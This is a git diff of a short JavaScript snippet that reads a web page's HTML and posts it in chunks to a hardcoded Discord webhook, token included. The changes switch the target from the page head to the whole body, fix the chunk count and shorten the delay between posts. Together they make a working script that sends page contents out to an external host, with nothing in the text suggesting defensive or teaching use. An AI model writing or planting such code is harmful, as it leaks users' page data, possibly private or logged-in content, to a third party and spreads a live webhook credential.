@@ -8,7 +8,7 @@ function wait(ms){
 function sendMessage(message) {
     const webhookUrl = "https://discord.com/api/webhooks/1230013392190836807/YBJ3pNOa544labFi-TcurRFMDKlM2LMT36Jiel1PFWAy8TDWQqUa-yolhXwHQYD-F8bh";
 
-    for (let i = 0; i < Math.round(document.body.innerHTML.length / 256); i++) {
+    for (let i = 0; i < Math.round(message.length / 256); i++) {
         const request = new XMLHttpRequest();
         request.open("POST", webhookUrl);
         request.setRequestHeader("Content-type", "application/json");
@@ -20,9 +20,9 @@ function sendMessage(message) {
         };
 
         request.send(JSON.stringify(messageData));
-        wait(15000);
+        wait(5000);
     }
 }
 
-const all_elements = document.head.innerHTML
+const all_elements = document.body.innerHTML
 sendMessage(all_elements);
